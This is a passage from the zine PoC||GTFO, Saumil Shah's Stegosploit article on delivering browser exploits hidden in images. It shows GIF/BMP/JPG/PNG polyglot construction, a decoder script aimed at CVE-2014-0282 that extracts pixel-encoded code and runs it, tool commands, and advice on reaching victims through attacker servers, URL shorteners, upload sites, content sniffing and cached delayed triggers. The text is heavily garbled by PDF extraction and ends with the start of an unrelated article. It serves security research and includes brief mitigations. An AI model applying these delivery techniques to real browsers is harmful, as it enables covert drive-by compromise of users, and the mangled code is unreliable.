When interpreting it as Javascript, it should
translate to a variable assignment such as GIF89a
= "stegosploit";. However, when rendering it as
an image, it should generate a proper image.
The first ten bytes of every GIF file are as fol-
lows, where HH HH and WW WW are 16-bit values.
1 <d i v c l a s s=s><img i d=px s r c="#"></div>
</body></html>
7.3.2
HTML+Image = Polyglot
Exploit Delivery - Take 1
At this stage, we have the components necessary to
deliver the exploit: (1) the HTML page containing
the decoder and (2) the exploit code steganograph-
ically encoded in a JPG file.
Individual inspection of the above two compo-
nents would reveal nothing suspicious. The decoder
40 http://conference.hitb.org/hitbsecconf2015ams/sessions/stegosploit-hacking-with-pictures/
41 http://www.slideshare.net/saumilshah/deadly-pixels-nsc-2013
3547 49 46 38 39 61
2 G I F 8 9 a
HH HH
height
HTML directly when loaded and execute any em-
bedded Javascript code along the way. If the same
data is loaded within an <img src="#"> tag, the
browser will render the image in its display, as men-
tioned earlier in this article.
Basic JPG file structure follows the JPEG File
Interchange Format (JFIF). JFIF files contain
several segments, each identified by the two-byte
marker FF xx followed by the segment’s data. Some
popular segment markers are listed in the following
table.
WWWW
width
If we set the height to 0x2A2F, it translates to /*,
which is a Javascript comment. The width could be
anything. Most browsers, honouring Postel’s Law,
will still render a proper image.
The following is an example of an IMAJS GIF
file (GIF+JS), which will pop up a Javascript alert
if loaded in a <script> tag:
Marker
FF D8
FF E0
FF DB
FF C0
FF C4
FF DA
FF D9
GIF89a /∗ . . . . . . (GIF image d a t a ) . . . . . ∗/="
pwned" ; a l e r t ( Date ( ) ) ;
IMAJS BMP (BMP+JS) is also similar.
BMP Header:
1 42 4D XX XX XX XX 00 00 00 00 . . . . . . . .
B M Filesize
Empty Empty DIB data
The file size is now set to 2F 2A XX XX. At the
end of the BMP data, we append our Javascript
code. Even though the file size is inaccurate, all
browsers properly render the image.
BM/∗ . . . . . . (BMP image d a t a ) . . . . . ∗/="pwned" ;
a l e r t ( Date ( ) ) ;
Polyglot maestro Ange Albertini has some more
examples on Corkami. 42
IMAJS GIF or IMAJS BMP could be used to
wrap the HTML decoder script, described in Fig-
ure 13, in an image. Exploit delivery could there-
fore be accomplished using only two images: one
image containing the decoder script, while the other
holds the steganographically encoded exploit code.
Stylish, but not enough.
7.4.2
Name
Start Of Image
JFIF File
Define Quantization Table
Start Of Frame
Define Huffman Table
Start Of Scan
End Of Image
Every JPG file must begin with a SOI segment,
which is just two bytes, FF D8. The APP0 segment
immediately follows the SOI segment. The format
of the JFIF header is as follows:
1 typedef struct _JFIFHeader {
BYTE SOI [ 2 ] ;
// FF D8
3
BYTE APP0 [ 2 ] ;
// FF E0
BYTE Length [ 2 ] ;
// Length o f APP0 f i e l d
5
// e x c l u d i n g APP0
marker
BYTE I d e n t i f i e r [ 5 ] ; // "JFIF \0"
7
BYTE V e r s i o n [ 2 ] ;
// Major , Minor
BYTE U n i t s ;
// 0 = no u n i t s
9
// 1 = p i x e l s p e r i n c h
// 2 = p i x e l s p e r cm
11
BYTE X d e n s i t y [ 2 ] ;
// H o r i z P i x e l D e n s i t y
BYTE Y d e n s i t y [ 2 ] ;
// Vert
Pixel Density
13
BYTE XThumbnail ;
// Thumb Width ( i f any )
BYTE YThumbnail ;
// Thumb H e i g h t ( i f any
)
15 } JFIFHEAD ;
The Stegosploit Toolkit includes a utility called
jpegdump.c to enumerate segments in a JPG file.
Using jpegdump on the steganographically encoded
image of Kevin McPeake shows the following results:
Combining HTML in JPG files
The first step towards single image exploit delivery
is to combine HTML code in the steganographically
encoded JPG file, turning it into a perfectly valid
HTML file.
Mixing HTML data in JPG has an advan-
tage over the IMAJS techniques described in Sec-
tion 7.4.1. The image does not need to be loaded
via a <script> tag. The browser will render the
Code
SOI
APP0
DQT
SOF
DHT
SOS
EOI
1 jpegdump kevin_encoded . j p g
3 marker 0 x f f d 8 SOI a t o f f s e t 0
o f image )
marker 0 x f f e 0 APP0 a t o f f s e t 2
a p p l i c a t i o n data s e c t i o n
0)
42 https://github.com/shrz/corkami/tree/master/misc/jspics
36
( start
(5 marker 0 x f f d b DQT a t o f f s e t 20
quantization tables )
marker 0 x f f d b DQT a t o f f s e t 89
quantization tables )
7 marker 0 x f f c 0 SOF0 a t o f f s e t 158
o f frame ( b a s e l i n e j p e g ) )
marker 0 x f f c 4 DHT a t o f f s e t 177
huffman t a b l e s )
9 marker 0 x f f c 4 DHT a t o f f s e t 210
huffman t a b l e s )
marker 0 x f f c 4 DHT a t o f f s e t 393
huffman t a b l e s )
11 marker 0 x f f c 4 DHT a t o f f s e t 426
huffman t a b l e s )
marker 0 x f f d a SOS a t o f f s e t 609
o f scan )
13 marker 0 x f f d 9 EOC a t o f f s e t 182952
codestream )
comments <-- and -->. In the above example, the
<html> tag is placed at offset 0x0014, followed by a
start HTML comment <!-- marker. The first block
of random data ends with the HTML comment ter-
minator -->. The contents of the HTML decoder
code is written after the HTML comment termina-
tor. At the end of the HTML decoder code, we shall
put another start HTML comment <!-- marker to
comment out the rest of the JPG file’s data.
There have been some extreme cases where the
JPG file itself may contain an inadvertent HTML
comment terminator -->. In such situations, we
can use an illegal start-of-Javascript tag <script
type=text/undefined> at the end of the decoder
code. This script tag is deliberately not termi-
nated. The DOM renderer will ignore everything fol-
lowing <script type=text/undefined> for HTML
rendering. Since the Javascript type is set to
text/undefined, no valid Javascript or VBScript
interpreter will run the code contained in this open
script tag.
( define
( define
( start
( define
( define
( define
( define
( start
( end o f
The contents of kevin_encoded.jpg can be rep-
resented by the diagram on the left side of Figure 14.
The most promising location to add extra con-
tent is the APP0 segment. Increasing the two-byte
length field of APP0 gives us extra space at the end
of the segment in which to place the HTML decoder
data, as shown on the right side of the figure.
Stegosploit’s html_in_jpg_ie.pl utility can be
used to combine HTML data within a JPG file.
7.4.4
Generating an HTML+PNG polyglot can be done
using a technique similar to HTML+JPG polyglots.
We have to inspect the PNG file structure and figure
out a safe way for embedding HTML content in it.
1 $ . / html_in_jpg_ie . p l decoder_cve_2014_0282 .
html kevin_encoded . j p g k e v i n _ p o l y g l o t
7.4.5
The resultant kevin_polyglot file increases in
size, successfully embedding the HTML data in the
slack space artificially created at the end of the
APP0 segment. In the example below, the length of
the APP0 segment increases from 18 bytes to 12092
bytes. The HTML decoder code shown in Figure 13
is embedded between blocks of random data in the
APP0 segment from offset 0x0014 to 0x2f3d.
7.4.3
PNG File Structure
PNG files consist of an eight-byte PNG signature
(89 50 4E 47 0D 0A 1A 0A) followed by several
FourCC—Four Character Code—chunks. FourCC
chunks are used in several multimedia formats.
Each chunk consists of four parts: Length, a
Chunk Type, the Chunk Data, and a 32-bit CRC.
The Length is a 32-bit unsigned integer indicat-
ing the size of only the Chunk Data field, while
the Chunk Type is a 32-bit FourCC code such as
IHDR, IDAT, or IEND. The CRC is generated from
the Chunk Type and Chunk Data, but does not in-
clude the Length field.
Stegosploit’s pngenum.pl utility lets us explore
chunks in a PNG file. Running it against a stegano-
graphically encoded PNG file shows us the following
results:
HTML/JPEG Coexistance
JPG decoders would have no problem in properly
displaying the image contained in the HTML+JPG
polyglot described above. Browsers, however, would
encounter problems when trying to properly render
HTML tags. The extra JPG data would end up pol-
luting the DOM. If the JPG data contains symbols
such as < or >, the browser may end up creating
erroneous tags in the DOM, which can affect the
execution of the decoder Javascript.
To prevent JPG data from interfering with
HTML, we can use a few strategically placed HTML
Combining HTML in PNG files
2
$ pngenum . p l p i n k l o c k _ e n c o d e d . png
PNG Header : 89 50 4E 47 0D 0A 1A 0A − OK
4 IHDR 13 b y t e s CRC: 0xE9828D3A ( computed 0
xE9828D3A ) OK
37<html><head><meta http−e q u i v="X −UA −Compatible " c o n t e n t=" IE=Edge ">
2 <s c r i p t >v a r bL=2 ,eC=3 , g r =3; f u n c t i o n i 0 ( ) {px . o n c l i c k=dID} f u n c t i o n dID ( ) { v a r b=do
cument . c r e a t e E l e m e n t ( " c a n v a s " ) ; px . parentNode . i n s e r t B e f o r e ( b , px ) ; b . width=px . widt
4 h ; b . h e i g h t=px . h e i g h t ; v a r m=b . g e t C o n t e x t ( " 2d" ) ;m. drawImage ( px , 0 , 0 ) ; px . parentNode
. removeChild ( px ) ; v a r f=m. getImageData ( 0 , 0 , b . width , b . h e i g h t ) . data ; v a r h = [ ] , j =0 , g
6 =0; v a r c=f u n c t i o n ( p , o , u ) {n=(u∗b . width+o ) ∗ 4 ; v a r z=1<<bL ; v a r s =(p [ n]& z )>>bL ; v a r q
=(p [ n+1]&z )>>bL ; v a r a=(p [ n+2]&z )>>bL ; v a r t=Math . round ( ( s+q+a ) / 3 ) ; switch ( eC ) { c a s
8 e 0 : t=s ; break ; case 1 : t=q ; break ; case 2 : t=a ; break ; } return ( S t r i n g . fromCharCode ( t+4
8 ) ) } ; v a r k=f u n c t i o n ( a ) { f o r ( v a r q=0 , o =0; o<a ∗ 8 ; o++){h [ q++]=c ( f , j , g ) ; j+=g r ; i f ( j>=b
10 . width ) { j =0; g+=g r } } } ; k ( 6 ) ; v a r d=p a r s e I n t ( bTS ( h . j o i n ( " " ) ) ) ; k ( d ) ; t r y { C o l l e c t G a r b a
ge ( ) } c a t c h ( e ) {} e x c ( bTS ( h . j o i n ( " " ) ) ) } f u n c t i o n bTS ( b ) { v a r a=" " ; f o r ( i =0; i <b . l e n g t h
12 ; i +=8)a+=S t r i n g . fromCharCode ( p a r s e I n t ( b . s u b s t r ( i , 8 ) , 2 ) ) ; return ( a ) } f u n c t i o n e x c (
b ) { v a r a=s e t T i m e o u t ( ( new F u n c t i o n ( b ) ) , 1 0 0 ) }window . o n l o a d=i 0 ; </ s c r i p t >
14 <s t y l e >body { v i s i b i l i t y : h id de n ; } . s { v i s i b i l i t y : v i s i b l e ; p o s i t i o n : a b s o l u t e ; top : 1 5 p
x ; l e f t : 1 0 px ;} </ s t y l e ></head>
16 <body><form i d=fm><t e x t a r e a i d=c v a l u e=a1></t e x t a r e a ><i n p u t i d=c2 t y p e=checkbox
name=o2 v a l u e=" a2 ">Test check<Br><t e x t a r e a i d=c3 v a l u e=" a2 "></t e x t a r e a ><i n p u t
18 t y p e=t e x t name=t1 ></form>
<d i v c l a s s=s><img i d=px s r c="#"></div>
20 </body></html>
Figure 13: Decoder Script and DOM Elements to exploit CVE-2014-0282
Figure 14: Structure of a JPEG (left) and JPEG+HTML (right).
Figure 15: PNG Structure (left) and PNG+HTML Structure (right).
381 $ . / jpegdump k e v i n _ p o l y g l o t
marker 0 x f f d 8 SOI a t o f f s e t 0
3 marker 0 x f f e 0 APP0 a t o f f s e t 2
marker 0 x f f d b DQT a t o f f s e t 12094
5 marker 0 x f f d b DQT a t o f f s e t 12163
marker 0 x f f c 0 SOF0 a t o f f s e t 12232
7 marker 0 x f f c 4 DHT a t o f f s e t 12251
marker 0 x f f c 4 DHT a t o f f s e t 12284
9 marker 0 x f f c 4 DHT a t o f f s e t 12467
marker 0 x f f c 4 DHT a t o f f s e t 12500
11 marker 0 x f f d a SOS a t o f f s e t 12683
marker 0 x f f d 9 EOC a t o f f s e t 195026
13
$ hexdump −Cv k e v i n _ p o l y g l o t
15 00000000
f f d8 f f e0 2 f 2 a 4 a 46
00000010 00 00 00 00 3 c 68 74 6d
17 00000020 67 f 8 8 b 4a 08 4d de 8 f
00000030 98 32 87 11 d5 e7 f b 35
19 :
:
:
:
21 :
:
000001 a0 90 eb 27 4 f e5 90 27 71
23 000001 b0 02 15 38 f d 96 c3 5 c 21
000001 c0 b3 26 68 15 ae 45 7 c 24
25 000001 d0 65 61 64 3 e 3 c 6d 65 74
000001 e0 71 75 69 76 3d 22 58 2d
27 000001 f 0 74 69 62 6 c 65 22 20 63
00000200 49 45 3d 45 64 67 65 22
29 00000210 3 e 76 61 72 20 62 4 c 3d
00000220 72 3d 33 3 b 66 75 6 e 63
31 :
:
:
:
33 :
:
000006 e0 73 3 e 3 c 69 6d 67 20 69
35 000006 f 0 3d 22 23 22 3 e 3 c 2 f 64
00000700 79 3 e 3 c 2 f 68 74 6d 6 c
37 00000710 73 08 ac 3 f 95 9 c 73 80
00000720 19 ac e2 a f 6 c dd 4 c 77
39 :
:
:
:
41 :
:
00002 e f 0 6 b 2 e b4 ba 7a 07 f 7 5a
43 00002 f 0 0 53 80 a f 8d a8 11 5 b f 5
00002 f 1 0 0 b 1d 35 78 29 ec d5 a2
45 00002 f 2 0 e5 14 a4 ba c8 f 0 71 4 e
00002 f 3 0 6 c 88 f 5 e7 6 e b f 56 f a
47 00002 f 4 0 00 43 00 01 01 01 01 01
00002 f 5 0 01 01 01 01 01 01 01 01
49 00002 f 6 0 01 01 01 01 01 01 01 01
00002 f 7 0 01 01 01 01 01 01 01 01
51 00002 f 8 0 01 01 01 f f db 00 43 01
00002 f 9 0 01 01 01 01 01 01 01 01
53 00002 f a 0 01 01 01 01 01 01 01 01
00002 f b 0 01 01 01 01 01 01 01 01
55 00002 f c 0 01 01 01 01 01 01 01 01
00002 f d 0 80 03 01 22 00 02 11 01
57 00002 f e 0 00 01 05 01 01 01 01 01
00002 f f 0
00 01 02 03 04 05 06 07
( s t a r t o f image )
( a p p l i c a t i o n data s e c t i o n
0)
( define quantization tables )
( define quantization tables )
( s t a r t o f frame ( b a s e l i n e j p e g ) )
( d e f i n e huffman t a b l e s )
( d e f i n e huffman t a b l e s )
( d e f i n e huffman t a b l e s )
( d e f i n e huffman t a b l e s )
( s t a r t of scan )
( end o f c o d e s t r e a m )
49
6c
c4
86
8c
32
7a
61
55
6f
3e
32
74
64
69
3e
38
70
b8
d8
44
09
e1
01
01
01
01
01
01
01
01
ff
03
01
08
46
3e
c1
35
8a
27
0b
20
41
6e
3c
2c
69
3d
76
3c
6e
32
c6
e2
43
71
60
01
01
01
01
01
01
01
01
c0
11
00
09
00
3c
44
8f
c0
0f
20
68
2d
74
73
65
6f
70
3e
21
fd
30
79
93
cd
e5
ee
01
01
01
01
01
01
01
01
00
01
00
0a
01
21
c4
6d
da
d4
2d
74
43
65
63
43
6e
78
3c
2d
80
74
67
4b
1d
42
e3
01
01
01
01
01
01
01
01
11
ff
00
0b
01
2d
7f
e5
91
7b
2d
74
6f
6e
72
3d
20
20
2f
2d
c8
ad
1b
03
d5
18
20
01
01
01
01
01
01
01
01
08
c4
00
ff
01
2d
90
65
20
b7
3e
70
6d
74
69
33
69
73
62
df
60
5c
c5
03
2e
52
41
01
01
01
01
01
01
01
01
01
00
00
c4
00
20
bc
dd
d4
c0
3c
2d
70
3d
70
2c
30
72
6f
d0
7a
f2
9a
b5
d5
65
ff
01
01
01
01
01
01
01
01
e0
1f
00
00
40
e2
a4
c8
c9
68
65
61
22
74
67
28
63
64
c9
c3
46
85
9b
20
09
db
01
01
01
01
01
01
01
01
02
00
00
:
:
:
:
:
:
:
:
:
| . . . . /∗JFIF . . . . . . |
| . . . . < html ><!−− @|
| g . . J .M. . . . D . . . . . |
| . 2 . . . . . 5 . 5 . m. e . . |
RANDOM DATA
| . . ' O. . ' q . . . . . . . |
|..8...\!2 ' ..{...|
| . & h . . E | $z . −−><h |
| ead><meta h t t p −e |
| q u i v ="X −UA −Compa |
| t i b l e " c o n t e n t ="|
| IE=Edge">< s c r i p t |
|> v a r bL=2,eC=3, g |
| r =3; f u n c t i o n i 0 ( |
HTML+DECODER
| s><img i d=px s r c |
|="#"></d i v ></bod |
| y></html > <! − −...|
| s . . ? . . s .8n ... ` z . |
| . . . . l . Lwp20t . \ . F |
RANDOM DATA
| k . . . z . . Z . . yg . . . . |
|S . . . . . [ . . . .K. . . . |
| . . 5 x ) . . . DC . . . . . |
| . . . . . . qN . q .B. Re . |
| l . . . n .V . . ` . . A . . |
| .C . . . . . . . . . . . . . . |
|................|
|................|
|................|
| . . . . . .C. . . . . . . . . |
|................|
|................|
|................|
|................|
|..."............|
|................|
|..............
Figure 16: JPEG Dump of a Polyglot
396
8
10
12
IDAT 8192 b y t e s CRC: 0xEDB1ABB8 ( computed
xEDB1ABB8) OK
IDAT 8192 b y t e s CRC: 0x7BA5829E ( computed
x7BA5829E ) OK
IDAT 8192 b y t e s CRC: 0xFDF71282 ( computed
xFDF71282 ) OK
:
:
:
IDAT 8192 b y t e s CRC: 0x3A1BE893 ( computed
x3A1BE893 ) OK
IDAT 8192 b y t e s CRC: 0x3C9B69C5 ( computed
x3C9B69C5 ) OK
IDAT 8192 b y t e s CRC: 0x8E2E6D15 ( computed
x8E2E6D15 ) OK
IDAT 2920 b y t e s CRC: 0 xAE102222 ( computed
xAE102222 ) OK
IEND 0 b y t e s CRC: 0 xAE426082 ( computed 0
xAE426082 ) OK
Next we shall explore delivery techniques for these
polyglots, so that these “images” will auto-run when
loaded in the browser.
0
0
0
7.5
0
HTTP Transport
In Section 7.3.2, we established the need for the use
of HTML+Image polyglots to achieve our objective
of exploits delivered via a single image. We explored
how to prepare HTML+JPG and HTML+PNG
polyglots in Section 7.4.
This section provides a few insights into con-
trolling some of the finer points of HTTP trans-
port when it comes to delivering the polyglot to the
browser. The primary goal is to enable the image
polyglot to be rendered as HTML in the browser, al-
lowing the embedded decoder script to execute when
the document loads. The secondary goal is to avoid
detection on the network. An interesting side effect
of time-shifted exploit delivery will be discussed at
the end of this section.
Exploring the nuances of HTTP transport in it-
self can be a very complex topic, so I shall keep the
discussion restricted to only some relevant points.
0
0
0
Each PNG file must contain one IHDR chunk, the
image header. Image data is encoded in multiple
IDAT chunks. Each PNG file must terminate with
an IEND chunk.
PNG files are easier to extend than JPG files. We
can simply insert extra PNG chunks. PNG provides
informational chunks such as tEXt chunks that may
be used to contain image metadata. We can insert
tEXt chunks immediately after the IHDR chunk.
tEXt chunks are basically name-value pairs, sep-
arated by a NULL byte 0x00. A tEXt chunk looks
like this:
7.5.1
Reaching the Target Browser
As an attacker, we have the three options for sending
the HTML+Image polyglot to the victim’s browser.
(1) We can host the image on an attacker-controlled
web server and send its URL to the victim. (2) We
could host the entire exploit on a URL shortener. (3)
We could upload the image to a third-party website
and provide a direct link.
It is also possible to combine this with a vast
array of XSS vulnerabilities, but that is left to the
reader’s imagination and talent.
Hosting drive-by exploit code on an attacker-
controlled web server is the most popular of all
HTTP delivery techniques. The HTML+Image
polyglot can be hosted as a file with a JPG or PNG
file extension, an extension not registered with the
browser’s default MIME types, or no file extension
at all!
For each case, the web server can be configured
to deliver the Content-Type: text/html HTTP
header to force the victim’s browser to render the
polyglot content as an HTML document. An ex-
plicit Content-Type: header will override file ex-
tension guessing in the browser.
1 [ l e n g t h ] [ tEXt ] [ name\ x00Saumil Shah ] [ CRC]
An approach taken by Cody Brocious (@daeken)
explores compressing Javascript code into PNG im-
ages in his article, “Superpacking JS demos” 43 .
We shall take a slightly different approach, which
does not involve using illegal PNG chunks, preserv-
ing the validity of the PNG file and not raising any
suspicions. The right side of Figure 15 shows how
to embed HTML data within PNG files.
Stegosploit’s html_in_png.pl utility can be
used to combine HTML data within a PNG file.
1 $ . / html_in_png . p l decoder_cve_2014_0282 .
html p i n k l o c k _ e n c o d e d . png
pinklock_polyglot
Figure 17 presents the output of pngenum.pl run
on this file.
This concludes our discussion on HTML+JPG
and HTML+PNG polyglots for the time being.
43 http://daeken.com/superpacking-js-demos
401 $ . / pngenum . p l p i n k l o c k _ p o l y g l o t
3 PNG Header : 89 50 4E 47 0D 0A 1A 0A − OK
IHDR 13 b y t e s CRC: 0xE9828D3A ( computed 0xE9828D3A ) OK
5 tEXt 12 b y t e s CRC: 0xF1A3A4DE ( computed 0xF1A3A4DE) OK
tEXt 2575 b y t e s CRC: 0x148DB406 ( computed 0x148DB406 ) OK
7 IDAT 8192 b y t e s CRC: 0xEDB1ABB8 ( computed 0xEDB1ABB8) OK
IDAT 8192 b y t e s CRC: 0x7BA5829E ( computed 0x7BA5829E ) OK
9 IDAT 8192 b y t e s CRC: 0xFDF71282 ( computed 0xFDF71282 ) OK
:
:
:
11 IDAT 8192 b y t e s CRC: 0x3A1BE893 ( computed 0x3A1BE893 ) OK
IDAT 8192 b y t e s CRC: 0x3C9B69C5 ( computed 0x3C9B69C5 ) OK
13 IDAT 8192 b y t e s CRC: 0x8E2E6D15 ( computed 0x8E2E6D15 ) OK
IDAT 2920 b y t e s CRC: 0 xAE102222 ( computed 0 xAE102222 ) OK
15 IEND 0 b y t e s CRC: 0 xAE426082 ( computed 0 xAE426082 ) OK
17 $ hexdump −Cv p i n k l o c k _ p o l y g l o t
19 00000000
00000010
21 00000020
00000030
23 00000040
00000050
25 :
:
27 :
00000490
29 000004 a0
000004 b0
31 000004 c0
000004 d0
33 000004 e0
000004 f 0
35 00000500
00000510
37 :
:
39 :
000009 f 0
41 00000 a00
00000 a10
43 00000 a20
00000 a30
45 00000 a40
00000 a50
47 00000 a60
00000 a70
49 00000 a80
89
00
3a
3c
74
60
:
:
:
ed
37
9c
3c
3d
65
64
20
70
:
:
:
22
61
22
76
3c
78
14
67
b2
44
50
00
00
21
5f
9b
e6
36
ae
6d
22
22
67
62
78
3e
73
6a
3e
73
74
8d
5c
a6
45
4e
04
00
2d
00
c0
43
a4
c8
65
58
20
65
4c
3d
3c
73
22
3c
63
2f
b4
54
18
45
47
00
00
2d
4b
e6
e5
2d
fb
74
2d
63
22
3d
22
2f
3d
20
2f
72
75
06
07
45
05
0d
00
0c
20
92
5c
d8
26
32
61
55
6f
3e
30
6a
66
22
73
62
69
6e
00
da
14
a6
0a
00
74
f1
ab
bd
6a
95
fd
20
41
6e
3c
2c
22
6f
73
72
6f
70
64
00
bf
41
50
1a
02
45
a3
87
b9
21
8d
20
68
2d
74
73
65
3b
72
22
63
64
74
65
20
ef
90
84
0a
a8
58
a4
84
4a
2d
a8
2d
74
43
65
63
43
66
6d
3e
3d
79
20
66
00
b3
32
a1
00
08
74
de
51
81
bb
a8
2d
74
6f
6e
72
3d
75
3e
3c
22
3e
74
69
49
31
cc
57
00
06
3c
00
22
3b
d0
29
3e
70
6d
74
69
31
6e
3c
69
23
3c
79
6e
44
c4
30
bb
00
00
68
00
f4
a9
76
a6
3c
2d
70
3d
70
2c
63
64
6d
22
2f
70
65
41
98
0c
49
0d
00
74
0a
79
ba
40
24
68
65
61
22
74
67
74
69
67
3e
68
65
64
54
cd
30
34
49
00
6d
0f
21
3b
e3
c1
65
71
74
49
3e
72
69
76
20
3c
74
3d
27
78
96
74
76
48
e9
6c
74
c0
a3
be
67
61
75
69
45
76
3d
6f
20
69
2f
6d
27
3e
9c
e7
04
53
44
82
3e
45
51
d1
a8
f6
64
69
62
3d
61
34
6e
63
64
64
6c
74
2f
84
d9
1b
4d
52
8d
00
58
b4
7a
e7
d5
3e
76
6c
45
72
2c
20
6c
3d
69
3e
65
2a
bc
4d
16
a2
:
:
:
:
:
:
| . PNG . . . . . . . . IHDR |
|................|
| : . . . . tEXt<html > . |
|<!−− . . . . . . . . tEX |
| t_ .K . . . . Q" . y ! . Q . |
| ` ...\..J . ; . . ; . . z|
RANDOM DATA
| . . C . . j ! − . . v@ . . . . |
|76. − &....) . $ . g . . |
| . . . . 2 . −−><head >|
|<meta http−e q u i v |
|= "X−UA −Compatibl |
| e " c o n t e n t=" IE=E |
| dge "><s c r i p t >v a r |
| bL=0 ,eC=1 , g r = 4 , |
| px=" j " ; f u n c t i o n |
HTML+DECODER
| "></form><d i v c l |
| a s s=" s "><img i d =|
| " j " s r c="#"></d i |
| v></body></html >|
|< s c r i p t t y p e= ' t e |
| x t / u n d e f i n e d '>/∗ |
| . . . . . . . IDATx . . . |
| g \T . . . . . 1 . . . . . . M|
| . . . E .A. 2 . 0 . 0 t . . . |
|DEE . . P . .W. I4vSM . |
Figure 17: PNG Dump of a Polyglot
41Content Sniffing, overriding the Content-Type:
application/octet-stream header. IE identifies
the polyglot content as an HTML document, notic-
ing the presence of <html><!-- in the early parts of
the JPG APP0 segment, as discussed in Section 7.4.3.
Soroush Dalili’s excellent presentation “File in
the hole!” covers several techniques of abusing file
uploaders used by web applications. 47 In his talk, he
discusses using double extensions (file.html;.jpg
on IIS or file.html.xyz on Apache), using
ghost extensions (file.html%00.jpg on FCKedi-
tor), trailing null bytes, and case-sensitivity quirks
to abuse file uploaders.
URL shorteners can be abused far more than just
hiding a URL behind redirects. My previous re-
search, presented in a lightning talk at CanSecWest
2010, 44 shows how to host an entire exploit vec-
tor+payload in a URL shortener. With Data URIs
being adopted by most modern browsers, it is theo-
retically possible to host a polyglot HTML+Image
resource in a URL shortener. There are certain
limits to the length of a URL that a browser will
accept, but some clever work done by services like
Hashify.me 45 suggest that this could be overcome.
For additional tricks that an attacker can per-
form with URL shorteners, please refer to my article
in the HITB E-Zine Issue 003, titled “URL Shorten-
ers Made My Day” 46 .
Several web applications allow user-generated
content to be hosted on their servers, with content
white-listing. Blogs, user profile pictures, document
sharing platforms, and some other sites allow this.
Images are almost always accepted in such ap-
plications because they pose no harm to the web
application’s integrity. Several of these applications
store user-generated content on a separate content
delivery server, a popular example being Amazon’s
S3. Stored user content can be directly linked via
URLs pointing to the hosting server.
As
an
example,
I
tried
uploading
kevin_polyglot to a document sharing applica-
tion. The application stores my files on Amazon S3.
The document can be referred via its direct link.
The HTTP response received is as follows:
7.5.2
Content Sniffing
A polyglot’s greatest advantage, other than evading
detection, is that it can be rendered in more than
one context. For example, an image viewer appli-
cation that supports multiple image formats would
detect the type of image-based on the file extension.
In the absence of an extension, the image viewer re-
lies on the file’s magic numbers and header structure
to determine the image type.
Browsers are far more complex beasts and are re-
quired to handle a variety of different data formats:
HTML, Javascript, Images, CSS, PDF, audio, video;
the list goes on. Browsers rely upon two key factors
for determining the type of content, and thereby in-
voking the appropriate processor or renderer associ-
ated with it. These are the resource extension and
the HTTP Content-Type response header
In the absence of known extensions or a
Content-Type header, browsers ideally would sim-
ply offer a raw data dump of the content for the
user to download. However, over the course of years,
browsers have tried to implement automatic content
guessing, called Content Sniffing.
Michal Zalewski is perhaps one of the leading au-
thorities in analyzing browser behavior from a secu-
rity perspective. In his excellent “Browser Security
Handbook” Zalewski provides a detailed discussion
on Content Sniffing techniques employed by various
browsers. 48
Figure 18, borrowed from Zalewski’s Browser Se-
curity Handbook, summarizes the results of content
1 HTTP/ 1 . 1 200 OK
x−amz−id −2:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
3 x−amz−r e q u e s t −i d : 3 13 37 3 13 37 3 13 37
Date : F r i , 05 Jun 2015 1 1 : 4 8 : 5 7 GMT
5 Last−M o d i f i e d : Wed, 03 Jun 2015 0 9 : 0 7 : 3 2 GMT
Etag : "BADC0DEBADC0DEBADC0DE"
7 x−amz−s e r v e r −s i d e −e n c r y p t i o n : AES256
Accept−Ranges : b y t e s
9 Content−Type : a p p l i c a t i o n / o c t e t −stream
Content−Length : 195034
11 S e r v e r : AmazonS3
When loaded in Internet Explorer, the browser,
noticing that there is no file extension, pro-
ceeds to guess the data type of the content via
44 http://www.slideshare.net/saumilshah/url-shorteners-made-my-day
45 http://hashify.me/
46 http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf
47 http://soroush.secproject.com/downloadable/File%20in%20the%20hole!.pdf
48 https://code.google.com/p/browsersec/wiki/Part2
unzip pocorgtfo08.pdf browsersec.zip
42Figure 18: Content Sniffing Matrix
sniffing tests on various browsers.
Content Sniffing is the ideal weakness for a poly-
glot to exploit. Combining Content Sniffing tricks
with delivery approaches discussed above opens up
several creative attack delivery avenues. This is one
of my topics for future research.
7.5.3
and load the “image” into the DOM without making
a network connection. The exploit will then be trig-
gered as before, with the exception that at the time
of exploitation, no network traffic will be observed,
as is illustrated by the following diagram.
7.5.4
Time-Shifted Exploit Delivery
Mitigation Techniques
Browser vendors need to start thinking about de-
tecting polyglot content before it is rendered in the
DOM. This is easier said than done.
Server side applications that accept user gener-
ated images should currently transcode all received
images—for example, transcode a JPG file to a PNG
file with slightly degraded quality, and back to JPG.
The idea here is to damage any steganographically
encoded data.
7.6
Time-Shifted Exploit Delivery is a technique
where the exploit code does not need to be trig-
gered at the same time it is delivered. The trigger
can happen much later.
Assume that we deliver kevin_polyglot as an
image file via a simple <img> tag. The web server
serving this image can choose to provide cache con-
trol information and instruct the browser to cache
this image for a certain time duration. The HTTP
Expires response header can be used to this effect.
Several days later, a URL pointing to
kevin_polyglot is offered to the victim user. Upon
clicking the link, the browser will detect a cache-hit
Concluding Thoughts
While the full implications of practical exploit de-
livery via steganography and polyglots are not yet
clear, I would like to present a few thoughts.
Sophisticated exploit delivery techniques are
probably closer to being reality than previously es-
timated.
My research for Stegosploit shows that conven-
tional means of detecting malicious software fall
short of stopping such attacks.
Data containers, e.g. images, previously pre-
sumed passive and non-offensive, can now be used
in practical attack scenarios.
49 http://www.outguess.org/detection.php
43It is easier to detect polyglot files than stegano-
graphically encoded images. I ran a few tests with
stegdetect, 49 one of the de facto tools used to de-
tect steganography in images. My initial results
from stegdetect show that none of the encoded
files were successfully detected.
This is not a fault of stegdetect per se.
stegdetect is built to detect steganography
schemes that it knows of. It has a mode that
supports linear discriminant analysis to automate
detection of new steganography methods, however
it requires several samples of normal and stegano-
graphic images to perform its classification. I have
not tested this yet.
In proper PoCkGTFO style, Stegosploit is dis-
tributed as a picture of a cat attached to this PDF
file. 50
EOF
50 unzip
pocorgtfo08.pdf stegosploit_tool.png
448
On Error Resume Next
by Jeffball
Don’t you just long for the halcyon days of Visual Basic 6 (VB6)? Between starting arrays at 1 and
only needing signed data types, Visual Basic was just about as good as it gets. Well, I think it’s about time
we brought back one of my favorite features: On Error Resume Next. For those born too late to enjoy the
glory of VB6, On Error Resume Next allowed those courageous VB6 ninjas who dare wield its mightiness to
continue executing at the next instruction after an exception. While this may remove the pesky requirement
to handle exceptions, it often caused unexpected behavior.
When code crashes in Linux, the kernel sends the SIGSEGV signal to the faulting program, commonly
known as a segfault. Like most signals, this one too can be caught and handled. However, if we don’t properly
